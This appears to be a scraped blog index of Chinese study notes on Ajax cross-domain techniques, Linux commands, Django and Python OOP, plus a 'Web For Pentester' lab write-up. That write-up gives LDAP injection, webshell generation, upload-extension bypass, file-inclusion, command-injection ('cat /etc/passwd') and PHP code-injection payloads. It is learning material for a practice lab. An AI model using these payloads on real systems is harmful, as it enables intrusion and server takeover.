Ajax通过XMLHttpRequest能够与远程的服务器进行信息交互，另外XMLHttpRequest是一个纯粹的javascript对象，这样的交互过程是在后台进行的，用户不易察觉，因此XMLHttpRequest实际已经突破了原有的javascript的安全限制，举个例子：假设某网站引用了其他站点的javascript，这个站点被compromise并在javascript中加入获取用户输入并通过ajax提交给其他站点，这样就可以源源不断收集信息。或者某网站因为存在漏洞导致XSS注入了javascript脚本，这个脚本就可以通过ajax提交给其他站点，这样就可以源源不断收集信息。如果我们又想利用XMLHttpRequest的无刷新异步交互能力，又不愿意公然突破javascript的安全策略，可以选择的方案就是给XMLHTTP加上严格的同源限制。这样的安全策略类似于Applet的安全策略，Iframe的限制仅仅是不能访问跨域HTMLDOM中的数据，而XMLHTTP则根本上限制了跨域请求的提交。随着Ajax技术和网络服务器的发展，对跨域的要求也越来越强烈，下面介绍Ajax的跨域技术 JSONPJSONP技术实际和Ajax没有关系，我们知道&lt;script&gt;标签可以加载跨域的javascript脚本，并且被加载的脚本和当前文档属于同一个域，因此在文档中可以调用/访问脚本中的数据和函数。如果javascript脚本中的数据是动态生成的，那么只要在文档中动态创建&lt;script&gt;标签就可以实现和服务端的数据交互。 JSONP就是利用&lt;script&gt;标签的跨域能力实现跨域数据的访问，请求动态生成的JavaScript脚本同时带一个callback函数名作为参数。其中callback函数本地文档的JavaScript函数，服务器端动态生成的脚本会产生数据，并在代码中以产生的数据为参数调用callback函数。当这段脚本加载到本地文档时，callback函数就被调用。 第一个站点的测试页面（http://localhost:8080/test.html）： 123456&lt;script src=&quot;http://localhost:8081/test_data.js&quot;&gt; &lt;script&gt; function test_handler(data) &#123; console.log(data); &#125; &lt;/script&gt; 服务器端的Javascript脚本（http://localhost:8081/test_data.js）： test_handler(&apos;{&quot;data&quot;: &quot;something&quot;}&apos;); 为了动态实现JSONP请求，可以使用Javascript动态插入&lt;script&gt;标签： 1234567&lt;script type=&quot;text/javascript&quot;&gt; // this shows dynamic script insertion var script = document.createElement(&apos;script&apos;); script.setAttribute(&apos;src&apos;, url); // load the script document.getElementsByTagName(&apos;head&apos;)[0].appendChild(script); &lt;/script&gt; JSONP协议封装了上述步骤，jQuery中统一是现在AJAX中(其中data type为JSONP)： http://localhost:8080/test?callback=test_handler 为了支持JSONP协议，服务器端必须提供特别的支持，另外JSONP只支持GET请求。 proxy使用代理方式跨域更加直接，因为SOP的限制是浏览器实现的。如果请求不是从浏览器发起的，就不存在跨域问题了。 使用本方法跨域步骤如下： 1. 把访问其它域的请求替换为本域的请求 2. 本域的请求是服务器端的动态脚本负责转发实际的请求 各种服务器的Reverse Proxy功能都可以非常方便的实现请求的转发，如Apache httpd + mod_proxy。 Eg. 为了通过Ajax从http://localhost:8080访问http://localhost:8081/api，可以将请求发往http://localhost:8080/api。 然后利用Apache Web服务器的Reverse Proxy功能做如下配置： ProxyPass /api http://localhost:8081/api CORSCross origin resource sharingCross-origin resource sharing (CORS) is a mechanism that allows a web page to make XMLHttpRequests to another domain. Such “cross-domain” requests would otherwise be forbidden by web browsers, per the same origin security policy. CORS defines a way in which the browser and the server can interact to determine whether or not to allow the cross-origin request. It is more powerful than only allowing same-origin requests, but it is more secure than simply allowing all such cross-origin requests.” —-Wikipedia 通过在HTTP Header中加入扩展字段，服务器在相应网页头部加入字段表示允许访问的domain和HTTP method，客户端检查自己的域是否在允许列表中，决定是否处理响应。 实现的基础是JavaScript不能够操作HTTP Header。某些浏览器插件实际上是具有这个能力的。 服务器端在HTTP的响应头中加入（页面层次的控制模式）： Access-Control-Allow-Origin: example.com Access-Control-Request-Method: GET, POST Access-Control-Allow-Headers: Content-Type, Authorization, Accept, Range, Origin Access-Control-Expose-Headers: Content-Range Access-Control-Max-Age: 3600 多个域名之间用逗号分隔，表示对所示域名提供跨域访问权限。”*”表示允许所有域名的跨域访问。 客户端可以有两种行为： 发送OPTIONS请求，请求Access-Control信息。如果自己的域名在允许的访问列表中，则发送真正的请求，否则放弃请求发送。 直接发送请求，然后检查response的Access-Control信息，如果自己的域名在允许的访问列表中，则读取response body，否则放弃。 本质上服务端的response内容已经到达本地，JavaScript决定是否要去读取。 cookie同源策略Cookie中的同源只关注域名，忽略协议和端口。所以https://localhost:8080/和http://localhost:8081/的Cookie是共享的。 Flash/SilverLight跨域 浏览器的各种插件也存在跨域需求。通常是通过在服务器配置crossdomain.xml，设置本服务允许哪些域名的跨域访问。客户端会首先请求此文件，如果发现自己的域名在访问列表里，就发起真正的请求，否则不发送请求。 &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE cross-domain-policy SYSTEM &quot;http://www.macromedia.com/xml/dtds/cross-domain-policy.dtd&quot;&gt; &lt;cross-domain-policy&gt; &lt;allow-access-from domain=&quot;*&quot;/&gt; &lt;allow-http-request-headers-from domain=&quot;*&quot; headers=&quot;*&quot;/&gt; &lt;/cross-domain-policy&gt; 通常crossdomain.xml放置在网站根目录。","categories":[{"name":"Journey of Study","slug":"Journey-of-Study","permalink":"/categories/Journey-of-Study/"}],"tags":[{"name":"Web","slug":"Web","permalink":"/tags/Web/"}]},{"title":"Beginner of Linux","slug":"Beginner-of-Linux","date":"2016-07-12T06:59:48.000Z","updated":"2016-07-22T08:10:44.000Z","comments":true,"path":"2016/07/12/Beginner-of-Linux/","link":"","permalink":"/2016/07/12/Beginner-of-Linux/","excerpt":"一直以来都是零零散散的学了一些linux的命令，现在要系统的学习一下。主要学习了一些快捷键，用户和文件权限管理，目录结构文件基本操作，管道，简单文本处理","text":"一直以来都是零零散散的学了一些linux的命令，现在要系统的学习一下。主要学习了一些快捷键，用户和文件权限管理，目录结构文件基本操作，管道，简单文本处理 Linux终端Terminal通常在使用Linux时，我们并不是直接与系统打交道，而是通过一个叫做Shell的中间程序来完成，在图形界面下为了实现在一个窗口中完成接受用户输入和显示输出，Linux系统提供了一个叫做终端模拟器的程序(Terminal)。终端本质上对应着Linux上的/dev/tty设备，Linux的多用户登录就是通过不同的/dev/tty设备完成的，Linux默认提供了6个纯命令行界面的”termimnal”(准确的说这里应该是6个virtual consoles)来让用户登录，在物理机系统上可以通过使用[Ctrl]+[Alt]+[F1]~[F6]进行切换。可以使用Ctrl]+[Alt]+[F7]来切换回图形界面 Shell通常在图形界面中对实际体验带来差异的不是终端模拟器，而大都是这个Shell，有壳就有核，这里的核就是指的UNIX/Linux内核，Shell是指“提供给使用者使用界面”的软件(命令解析器)，类似于DOS下的command(命令行)和后来的cmd.exe。普通意义上的Shell就是可以接受用户输入命令的程序。 Unix/Linux操作系统下的Shell既是用户交互的界面，也是控制系统的脚本语言。常见的Shell有bash,zsh,ksh,csh等 一些重要的快捷键 [Tab] 使用Tab键来进行命令补全 [Ctrl+c] 强行终止当前程序 [Ctrl+d] 键盘输入结束或退出终端 [Ctrl+a/e] 将光标移至输入行头/尾 [Ctrl+k] 删除从光标所在位置到行末 [Alt+Backspace] 向前删除一个单词 通配符 * 匹配0或多个字符 ? 匹配任意一个字符 [list] 匹配list中的任意单一字符 [!list] 匹配除list中的任意单字符以外的字符 [c1-c2] 匹配c1-c2中的任意单字符，如[0-9][a-z] {string1,string2,…} 匹配string1或string2或更多其一字符 {c1..c2} 匹配c1-c2中全部字符，如{1-10} 用户及文件权限管理Linux用户管理Linux是一个可以实现多用户登录的操作系统，这些用户共享一些主机的资源，但也分别有自己的用户空间用于存放各自的文件。但实际上他们的文件都是放在同一个物理磁盘上的甚至同一个逻辑分区或者目录里，但是由于Linux的用户管理和权限机制，不同用户不可以轻易的查看和修改他人的文件 查看用户 pts代表当前为伪终端，伪是相对于/dev/tty设备而言的，后边的/0,/1代表着伪终端序号，时间为启动时间 创建用户在Linux系统里，root账户拥有整个系统至高无上的权力，比如新建／添加用户。 root权限，系统权限的一种，与SYSTEM权限可以理解成一个概念，但高于Administrator权限，root时Linux和Unix系统中的超级管理员用户账户，该账户拥有整个系统至高无上的权力，所有对象都可以操作。 我们一般登录系统时都是以普通账户的身份登录的，要创建用户需要root权限，需要用到sudo这个命令。使用sudo命令的两大前提，一是要知道当前登录用户的密码，二是当前用户必须在sudo用户组。 su 可以切换到用户user sudo 可以以特权级别运行cmd命令 su- 切换用户，同时环境变量也会跟着改变成目标用户的环境变量 新建好用户后，即可使用上述命令登录，想退出当前用户可以使用[Ctrl+d] 用户组在Linux里面每个用户都属于一个用户组，用户组简单的理解就是一组用户的集合，它们共享一些资源和权限，同时拥有私有资源。一个用户可以属于多个用户组。查看用户属于哪个用户组有两个方法 使用groups命令创建用户时如果不指定用户组的话，默认会自动创建一个与用户名相同的用户组。有的用户没有显示属于sudo用户组但却可以使用sudo命令获取root权限，这是因为/etc/sudoers.d的目录下创建了该用户的文件。 查看/etc/group文件 /etc/group文件格式说明group_name:password:GID:user_list 将其他用户加入sudo用户组使用usermod命令可以为用户添加用户组 删除用户 Linux文件权限查看文件权限 变更文件所有者在当前文件所有者的角色下在该文件的目录中执行 sudo chown [即将拥有权限的用户名] [文件名] 修改文件权限 方式一：二进制数字表示 每个文件的三组权限（拥有者，用户组，其他用户）分别对应一组”rwx”，也就是一个7，如果当前文件只想当前用户可用，就可以 chmod 700 [文件名] 方式二：加减赋值操作 完成上述相同的效果，可以 chmod go-rw [文件名] “g”代表group “o”代表others “u”代表user “＋”“－”就分表表示增加和去掉相应的权限 Linux目录结构及文件基本操作目录结构UNIX 是以目录为主的，Linux 也继承了这一优良特性。 Linux 是以树形目录结构的形式来构建整个系统的，可以理解为一个用户可操作系统的骨架。虽然本质上无论是目录结构还是操作系统内核都是存储在磁盘上的，但从逻辑上来说 Linux 的磁盘是“挂在”（挂载在）目录上的，每一个目录不仅能使用本地磁盘分区的文件系统，也可以使用网络上的文件系统。举例来说，可以利用网络文件系统（Network File System，NFS）服务器载入某特定目录等。 FHS标准 FHS（英文：Filesystem Hierarchy Standard 中文：文件系统层次结构标准），多数 Linux 版本采用这种文件组织形式，FHS 定义了系统中每个区域的用途、所需要的最小构成的文件和目录同时还给出了例外处理与矛盾处理。FHS 定义了两层规范: 第一层是/ 下面的各个目录应该要放什么文件数据，例如 /etc 应该要放置设置文件，/bin 与 /sbin 则应该要放置可执行文件等等。第二层则是针对 /usr 及 /var 这两个目录的子目录来定义。例如 /var/log 放置系统登录文件、/usr/share 放置共享数据等等。 FHS 依据文件系统使用的频繁与否以及是否允许用户随意改动（注意，不是不能，学习过程中，不要怕这些），将目录定义为四种交互作用的形态，如下表所示： 文件基本操作新建空白文件使用touch命令新建空白文件，使用mkdir新建目录(-p参数代表如果父目录不存在则创建父级目录) 复制和删除使用cp复制文件，使用rm删除文件，-r代表操作目录，-f代表强制删除 移动和重命名使用mv移动文件和为单一文件重命名，使用rename为多个文件重命名 查看文件使用cat正序查看文件，使用tac倒序查看文件，nl命令添加行号并打印，比 cat -n更专业more和less是更专业的用来查看文件的命令，file命令用来查看文件类型 文件打包与压缩只记录最常用的tar解压缩 tar -xf [filename] -c [要解压到的路径] 管道管道是一种通信机制，通常用于进程间的通信（也可通过socket进行网络通信），它表现出来的形式就是将前面每一个进程的输出(stdout)直接作为下一个进程的输入(stdin)。我们在使用一些过滤程序时经常会用到的就是匿名管道，在命令行中由 | 分隔符表示，例： ls -al /etc | less cut命令打印每一行的某一字段，例：打印/etc/passwd文件中以:为分隔符的第一个字段和第六个字段分别表示用户名和其家目录 cut /etc/passwd -d &apos;:&apos; -f 1,6 grep命令在文本中或stdin中查找匹配字符串，grep命令的一般形势为： grep [命令选项]... 用于匹配的表达式 [文件]... wc命令简单小巧的计数工具，用于统计并输出一个文件中行，单词和字节的数目 wc /etc/passwd sort排序命令cat /etc/passwd | sort cat /etc/passwd | sort -r 反序 cat /etc/passwd | sort -t&apos;:&apos; -k 3 -n uniq去重命令简单的文本处理tr命令可以用来删除一段文本信息中的某些文字或者将其进行转换 tr [option]...SET1 [SET2] 常用选项有 -d 删除和set1匹配的字符，注意不是全词匹配也不是按字符顺序匹配 -s 去除set1注定的在输入文本中连续并重复的字符 col命令可以将Tab换成对等数量的空格键或者反转这个操作 col [option] 常用选项有 -x 将Tab转换为空格 -h 将空格转换为Tab(默认选项) join命令用于将两个文件中包含相同内容的那一行合并在一起 join [option]... file1 file2 常用选项有 -t 指定分隔符，默认为空格 -i 忽略大小写差异 -1 指明第一个文件要用哪个字段来对比，默认对比第一个字段 -2 指明第二个文件要用哪个字段来对比，默认对比第一个字段 paste命令与join命令类似，在不对比数据的情况下，简单地将多个文件合并在一起，以Tab隔开 paste [option] file... 常用选项有 -d 指定合并的分隔符，默为认为Tab -s 不合并到一行，每个文件为一行","categories":[{"name":"Journey of Study","slug":"Journey-of-Study","permalink":"/categories/Journey-of-Study/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"/tags/Linux/"}]},{"title":"Go Django I","slug":"Go-Django-I","date":"2016-07-12T06:03:54.000Z","updated":"2016-07-23T10:35:50.000Z","comments":true,"path":"2016/07/12/Go-Django-I/","link":"","permalink":"/2016/07/12/Go-Django-I/","excerpt":"Python中Web开发框架Django的学习记录。本篇主要学习了Django的安装以及视图和URL的配置。","text":"Python中Web开发框架Django的学习记录。本篇主要学习了Django的安装以及视图和URL的配置。 0x1 介绍DjangoDjango是一个高效的Web开发框架，提供了通用Web开发模式的高度抽象，提供了频繁进行的编程作业的快速解决方法，以及为“如何解决问题”提供了清晰明了的约定。同时，Django尝试留下了一些方法，可以根据需要在framework之外来开发 主页 https://www.djangoproject.com/ 0x1.1 安装pip install Django==1.9.7 0x1.2 安装数据库Django支持四种数据库： PostgreSQL (http://www.postgresql.org/) SQLite 3 (http://www.sqlite.org/) MySQL (http://www.mysql.com/) Oracle (http://www.oracle.com/) djangobook推荐安装postgresql，安装完postgresql还需要安装psycopg2这个开发包，在pip install psycopg2时遇到了问题，解决方法参照http://blog.csdn.net/muzilanlan/article/details/50421693 0x1.3 开始一个项目第一次使用Django，必须进行一些初始化设置工作。新建一个工作目录，然后进入该目录，运行命令django-admin.py startproject mysite，这样会在当前目录下创建一个目录：mysite，包含四个文件 __init__.py ：让 Python 把该目录当成一个开发包 (即一组模块)所需的文件。 这是一个空文件，一般不需要修改它。 manage.py ：一种命令行工具，允许以多种方式与该 Django 项目进行交互。键入python manage.py help，看一下它能做什么。应当不需要编辑这个文件；在这个目录下生成它纯是为了方便。 settings.py ：该 Django 项目的设置或配置。查看并理解这个文件中可用的设置类型及其默认值。 urls.py：Django项目的URL设置。可视其为你的django网站的目录。目前，它是空的。 0x1.4 运行开发服务器django开发服务是可用在开发期间的，一个内建的，轻量的web服务。 我们提供这个服务器是为了让你快速开发站点，也就是说在准备发布产品之前，无需进行产品级 Web 服务器（比如 Apache）的配置工作。 开发服务器监测你的代码并自动加载它，这样你会很容易修改代码而不用重启动服务。 切换到项目目录里（cd mysite），运行下面的命令： python manage.py runserver 默认情况下， runserver 命令在 8000 端口启动开发服务器，且仅监听本地连接。 要想要更改服务器端口的话，可将端口作为命令行参数传入： python manage.py runserver 8080 通过指定一个 IP 地址，你可以告诉服务器–允许非本地连接访问。 如果想和其他开发人员共享同一开发站点的话，该功能特别有用。 0.0.0.0 这个 IP 地址，告诉服务器去侦听任意的网络接口。 python manage.py runserver 0.0.0.0:8000 完成这些设置后，你本地网络中的其它计算机就可以在浏览器中访问你的 IP 地址了。比如： http://192.168.1.103:8000/ 0x2 视图和URL配置页面的内容是靠view function（视图函数） 来产生，URL定义在 URLconf 中。首先，我们先写一个Hello World视图函数。 第一份视图在mysite文件夹中创建一个叫做views.py的空文件（对此文件的文件名并没有特别的要求，只是把它命名成views.py是个好主意），这个模块将包含这一章的视图。以下代码为views.py的内容： 1234from django.http import HttpResponsedef hello(request): return HttpResponse(&quot;Hello World&quot;) 首先导入django.http中的HttpResponse类，接下来定义一个叫做hello的视图函数，每个视图函数至少要有一个参数，通常被叫做request。 这里主要讲的是：一个视图就是Python的一个函数，这个函数第一个参数的类型是HttpRequest，这个函数返回一个HttpResponse实例。为了使一个Python的函数成为一个Django可识别的视图，它必须满足这两个条件。 第一个URLconf定义完一个视图之后，还需要通过一个详细描述的URL来显式的告诉服务器并且激活这个视图。为了绑定视图函数和URL，需要使用URLconf URLconf就像是Django所支撑网站的目录。它本质是一个URL模式以及要为该URL模式调用的视图函数之间的映射表。Django就是以这种方式知道哪个URL调用哪段代码 前一章中执行 django-admin.py startproject 时，该脚本会自动建了一份 URLconf（即 urls.py 文件）。 默认的urls.py会像下面这个样子： 123456789101112131415161718192021&quot;&quot;&quot;mysite URL ConfigurationThe `urlpatterns` list routes URLs to views. For more information please see: https://docs.djangoproject.com/en/1.9/topics/http/urls/Examples:Function views 1. Add an import: from my_app import views 2. Add a URL to urlpatterns: url(r&apos;^$&apos;, views.home, name=&apos;home&apos;)Class-based views 1. Add an import: from other_app.views import Home 2. Add a URL to urlpatterns: url(r&apos;^$&apos;, Home.as_view(), name=&apos;home&apos;)Including another URLconf 1. Import the include() function: from django.conf.urls import url, include 2. Add a URL to urlpatterns: url(r&apos;^blog/&apos;, include(&apos;blog.urls&apos;))&quot;&quot;&quot;from django.conf.urls import urlfrom django.contrib import adminurlpatterns = [ url(r&apos;^admin/&apos;, admin.site.urls),] 注: 上面的代码是我自己项目中生成的代码，与书中的代码有差别 现在可以将上面写的视图函数与url对应起来： 12345678from django.conf.urls import urlfrom django.contrib import adminfrom views import hellourlpatterns = [ url(r&apos;^admin/&apos;, admin.site.urls), url(r&apos;^hello/$&apos;, hello)] 然后访问localhost:8000/hello/ 网站根目录以及404当试图访问网站根目录localhost:8000/时，会出现404错误，因为根目录跟任何其它目录一样，需要被映射给相应的视图 Django的404错误信息比原404错误更加实用，它精确的告诉开发者Django调用那个URLconf及其包含的每个模式。这些敏感信息应该只呈现给开发者，出于这个考虑，这个页面只会在调试模式下显示 这时需要添加如下代码： 123456789from django.conf.urls import urlfrom django.contrib import adminfrom views import hello, home_pageurlpatterns = [ url(r&apos;^admin/&apos;, admin.site.urls), url(r&apos;^hello/$&apos;, hello), url(r&apos;^$&apos;, home_page)] 第二个视图：动态内容1234567views.pydef current_datatime(request): now = datetime.datetime.now() html = &quot;&lt;html&gt;&lt;body&gt;It is %s now&lt;/body&gt;&lt;/html&gt;&quot; % now return HttpResponse(html)urls.pyurl(r&apos;^time/$&apos;, current_datatime) Django是有时区意识的，默认时区为America/Chicago，可以在settings.py文件中更改这个值 第三个视图：动态URL在大多数Web应用程序中，URL通常都包含有相关的参数。举个例子，一家在线书店会为每一本书提供一个URL，如/books/243/,/books/3312/ 试想这样一种情况，不同的页面显示不同时差的时间，显然为每个页面写一个视图函数并对应一个url不是一个好办法。那么如何设计程序来处理任意数量的时差？答案是：使用通配符 url(r&apos;^time/plus/(\\d{1,2})/$&apos;, hours_ahead) \\d{1,2}是需要匹配的时差，我们想要把这个数字作为参数，所以用圆括号把它扩起来 接下来写视图函数： 1234567891011from django.http import HttpResponse, Http404import datetimedef hours_ahead(request, offset): try: offset = int(offset) except ValueError: raise Http404() dt = datetime.datetime.now() + datetime.timedelta(hours=offset) html = &quot;&lt;html&gt;&lt;body&gt;In %s hour(s), it is %s now&lt;/body&gt;&lt;/html&gt;&quot; % (offset, dt) return HttpResponse(html) offset是从URL中提取出来的(圆括号扩起来的内容)","categories":[{"name":"Journey of Study","slug":"Journey-of-Study","permalink":"/categories/Journey-of-Study/"}],"tags":[{"name":"Python","slug":"Python","permalink":"/tags/Python/"},{"name":"Django","slug":"Django","permalink":"/tags/Django/"}]},{"title":"Web For Pentester","slug":"Web-For-Pentester","date":"2016-07-05T05:01:47.000Z","updated":"2016-08-17T06:54:02.000Z","comments":true,"path":"2016/07/05/Web-For-Pentester/","link":"","permalink":"/2016/07/05/Web-For-Pentester/","excerpt":"姜姜姜姜！渗透测试套装Web For Pentester","text":"姜姜姜姜！渗透测试套装Web For Pentester LDAP attacksLDAP(lightweight directory access protocol)用于访问网络中的目录服务 每个LDAP查询使用一个或多个搜索过滤器，它们决定了请求返回的目录项。搜索过滤器可以使用各种逻辑运算符来表示复杂的搜索条件，最常用的过滤器如下： 简单匹配条件：对每个属性的值进行匹配，例如：(username=almond) 析取查询： 指定多个条件，返回的目录项只需要满足其中一个条件即可，例如：(|(cn=XXX)(sn=sss)(on=sss) 合取查询： 指定多个条件，返回的目录项必须满足所有条件，例如：(&amp;(username=almondq)(password=123)) Example 1 一些LDAP服务器授权NULL bind：如果null值被提交给服务器，服务器会绑定连接，php code会认为这个凭据是正确的 为了绑定两个null值，需要把参数全部删除，但是不能以username=&amp;password=这种方式，一定要全部删除，如下图 Example 2 username=hac*&amp;password=hacker 也可以获取授权，在LDAP中用*匹配任意值 But, username=hacker&amp;password=hack* 无法获取，因为密码可能被hashed 所以可以推测过滤器如下： (&amp;(username=[INPUT1])(userPassword=HASH[INPUT2])) 所以可以构造如下输入： hacker))%00(&amp;(username=hacker NULL BYTE%00用来get rid of the end of the filter，此时可以以任何密码授权为hacker，同理： 获得admin授权 File Upload大部分网络应用都有上传功能，如用户头像上传，图片上传，文档上传等，一些实现文件上传功能的代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者上传任意web脚本语言，并能够将这些文件传递给脚本解释器，就可以在远程服务器上执行任意脚本 大多数的文件上传漏洞都会被利用来留下webshell以方便后续进入系统，webshell是以asp，php，jsp活着cgi等网页文件形式存在的一种命令执行环境，也可以称其为一种网页后门，攻击者在入侵了一个网站后，通常会将这些文件与服务器web目录下正常的网页混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的 一句话木马 webshell tool: b374k项目地址： https://github.com/b374k/b374k 使用命令下载到电脑中 git clone https://github.com/b374k/b374k 生成webshell的命令： php index.php -o [shellName].php -p [password] -s -b -z gzcompress -c 9 php index.php -o [shellName].php -p [password] -t garuda -s Example 1这个例子没有任何检查，可以随意上传php文件，此处上传上一节生成的webshell文件 可得到下图 Example 2这个例子进行了后缀检查，无法上传php文件，但是可以通过更改后缀为php3来绕过检查，在其他系统中php4，php5可能也可以成功。也可以在php后缀后面加上服务器(此练习中为apache)无法处理的后缀，比如.php.blah File Include服务器通过php的特性函数去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件。文件包含漏洞可分为远程文件包含(RFI)和本地文件包含(LFI)。涉及到的危险函数： include(): 包含并运行指定文件，当包含外部文件发生错误时，系统给出警告，但整个php文件继续执行 require(): 跟include唯一的不同是，当产生错误时，停止执行 include_once(): 与include几乎相同，只是会在导入之前先检测该文件是否已经导入 require_once(): 同上 文件包含漏洞也可以被用作目录遍历来读取任意文件 Example 1 尝试将https://pentesterlab.com/test_include.txt包含在此例中，此txt文件包含phpinfo() 成功出现服务器配置信息 Example 2 此例与1相比，对文件后缀进行了控制，include($_GET(“page”).”.php”)，这种情况下，可以使用%00进行截断，但是这种截断方法只在php5.3.4版本之前有效 上例演示的是本地文件包含，可以用来包含本地敏感文件，或者结合文件上传漏洞 远程文件包含的话，可以在包含的url后边添加?或者&amp;来截断 Command Injection命令注入是因为用作命令一部分的信息缺少过滤或者编码。这些信息可能是用户提交的数据，包括每个url，请求主体参数及cookie，所以要检查每项功能中的所有这些项 不同的命令解释器处理shell元字符的方式各不相同 有两种类型的元字符可以用于在一个现有命令中注入一个独立的命令 字符; | &amp;和换行符用于将几个命令逐个连在一起 反引号(`)用于将一个独立的命令包含在最初的命令处理的数据中（即反引号里面的命令先执行） Example 1 第一个例子没有进行任何过滤，可直接进行命令注入，在参数后边加上 &amp;&amp;(编码为%26) cat /etc/passwd Example 2第二个例子对参数进行了确认，如果在参数后面添加内容会显示无效地址 但是确认机制出现了疏漏，可以通过添加换行符/n（编码为%0a）来截断 Example 3此例进行了跳转。在php中，如果参数的值不符合某些安全限制的话，最简单的方式是用header方法重定向。然而，虽然浏览器进行了跳转，但是这个方法并没有停止执行流程，脚本仍然会以危险的参数完成执行。开发者需要在header方法之后调用die方法来避免这个漏洞 既然浏览器会跳转，所以此例不能用浏览器进行，我选择用telnet 得到的响应文件头会发现状态码为302 但是仍然可以在响应内容中看到cat /etc/passwd的内容 Code Injection代码执行是对于用户可控的数据缺少过滤或者编码造成的。当利用代码注入时，需要在发送给应用程序的信息中注入代码，例如，如果想运行ls命令，需要发送system(“ls”)到应用程序（因为是php应用） 像SQL注入那样，可以使用相同值来测试和确认是否有代码注入漏洞： 用注释注入/ random value / 注入一个字符串连接符（点）“.”（双引号的作用是闭合eval(“”)的前一个引号以及后一个引号） 用类似”.”ha”.”cker”.”的形式代替hacker 还可以利用基于时间的探测，可以利用php中的sleep方法，可以在以下两个行为中看出区别： 不用sleep方法，或者延迟0 sleep(0) 然后长延迟sleep(10) Example 1例1是毫无防御措施的代码注入，首先尝试注入”，得到报错，信息中有提示eval() Parse error: syntax error, unexpected &apos;!&apos;, expecting &apos;,&apos; or &apos;;&apos; in /var/www/codeexec/example1.php(6) : eval()&apos;d code on line 1 然后注入”.”,可以看到结果和上图没有区别 所以可以肯定有代码注入漏洞，然后注入”;system(‘ls’);// 成功执行（注意要用//注释掉后面的内容） Example 2当给信息排序的时候，开发者用两个方法：1. sql语句中的order by 2. php中的usort usort方法通常和create_function一起使用来根据用户可控数据动态生成一个排序函数。如果应用程序没有进行过滤和确认，可以导致代码执行 首先尝试注入单引号得到 Parse error: syntax error, unexpected T_CONSTANT_ENCAPSED_STRING in /var/www/codeexec/example2.php(22) : runtime-created function on line 1 Warning: usort() expects parameter 2 to be a valid callback, no array or string given in /var/www/codeexec/example2.php on line 22 create_function的源码如下： 123456789ZEND_FUNCTION(create_function)&#123; [...] eval_code = (char *) emalloc(eval_code_length); sprintf(eval_code, &quot;function &quot; LAMBDA_TEMP_FUNCNAME &quot;(%s)&#123;%s&#125;&quot;, Z_STRVAL_PP(z_function_args), Z_STRVAL_PP(z_function_code)); eval_name = zend_make_compiled_string_description(&quot;runtime-created function&quot; TSRMLS_CC); retval = zend_eval_string(eval_code, NULL, eval_name TSRMLS_CC); [...] 可以看出会被执行的代码在{..}中，我们需要这个信息。与上例相反，不需要用单引号或双引号，需要的是闭合大括号然后把剩下的部分注释掉，进行以下尝试： ?order=id;}//：得到一个错误消息Parse error: syntax error, unexpected ‘;’,可能漏掉了一个或者多个括号 ?order=id);}//：得到一个warning，可能是正确的做法，因为warning不会停止执行流 ?order=id));}//得到一个错误信息Parse error: syntax error, unexpected ‘)’，多了一个括号 于是知道了如何正确地结束代码，就可以执行任意代码","categories":[{"name":"Journey of Study","slug":"Journey-of-Study","permalink":"/categories/Journey-of-Study/"}],"tags":[{"name":"Web","slug":"Web","permalink":"/tags/Web/"},{"name":"pentest","slug":"pentest","permalink":"/tags/pentest/"}]},{"title":"OOP in Python","slug":"OOP-in-Python","date":"2016-06-15T01:58:14.000Z","updated":"2016-07-22T08:26:55.000Z","comments":true,"path":"2016/06/15/OOP-in-Python/","link":"","permalink":"/2016/06/15/OOP-in-Python/","excerpt":"Python中的面向对象编程","text":"Python中的面向对象编程 类类是现实世界的抽象，是对象的定义，实例是真正的实物 创建类123class className(bases): &apos;class documentation string&apos; #&apos;类文档字符串&apos; class_suite #类体 类属性与方法12345class MyClass(object): foo = 100 def myNoActionMethod(self): pass 要知道一个类有哪些属性，有两种方法，第一种是使用dir()内建函数，另外时通过访问类的字典属性dict 12print dir(MyClass)[&apos;__class__&apos;, &apos;__delattr__&apos;, &apos;__dict__&apos;, &apos;__doc__&apos;, &apos;__format__&apos;, &apos;__getattribute__&apos;, &apos;__hash__&apos;, &apos;__init__&apos;, &apos;__module__&apos;, &apos;__new__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__setattr__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;, &apos;__weakref__&apos;, &apos;foo&apos;, &apos;myNoActionMethod&apos;] 12print MyClass.__dict__&#123;&apos;__module__&apos;: &apos;__main__&apos;, &apos;__dict__&apos;: &lt;attribute &apos;__dict__&apos; of &apos;MyClass&apos; objects&gt;, &apos;foo&apos;: 100, &apos;__weakref__&apos;: &lt;attribute &apos;__weakref__&apos; of &apos;MyClass&apos; objects&gt;, &apos;__doc__&apos;: None, &apos;myNoActionMethod&apos;: &lt;function myNoActionMethod at 0x1004cf5f0&gt;&#125; 可以看到，dir()返回的仅是对象的属性的一个名字列表，而dict返回的是一个字典，它的键是属性名，键值时相对应的属性对象的数据值 特殊的类属性 实例类被初始化得到实例 初始化mc = MyClass() __init__()构造器方法当类被调用，实例化的第一步是创建实例对象，一旦对象创建了，Python检查是否实现了__init__()方法。默认情况下，如果没有定义（或覆盖）特殊方法__init__()，对实例不会施加任何特别的操作。任何所需的特定操作，都需要程序员实现__init__()，覆盖它的默认行为 然而，如果__init__()已被实现，那么它将被调用，实例对象作为第一个参数self被传递进去，像标准方法调用一样，调用类时，传递的任何参数都交给了__init__() __new__()构造器方法与__init__()相比，__new__()方法更像一个真正的构造器。Python用户可以对内建类型进行派生，因此，需要一种途径来实例化不可变对象，比如派生字符串，数字等。在这种情况下，解释器则调用类的__new__ ()方法，一个静态方法，并且传入的参数是在类实例化操作时生成的。__new__ ()会调用父类的__new__ ()来创建对象 __del__()析构函数只有当一个实例的全部引用都删除之后这个实例的析构函数才会被调用 实例属性 vs 类属性当实例没有和类重名的属性时，可以通过实例访问类属性，但是无法通过实例改变类属性（可变属性：列表，字典除外）","categories":[{"name":"Journey of Study","slug":"Journey-of-Study","permalink":"/categories/Journey-of-Study/"}],"tags":[{"name":"Python","slug":"Python","permalink":"/tags/Python/"}]},{"title":"Functions and Functional 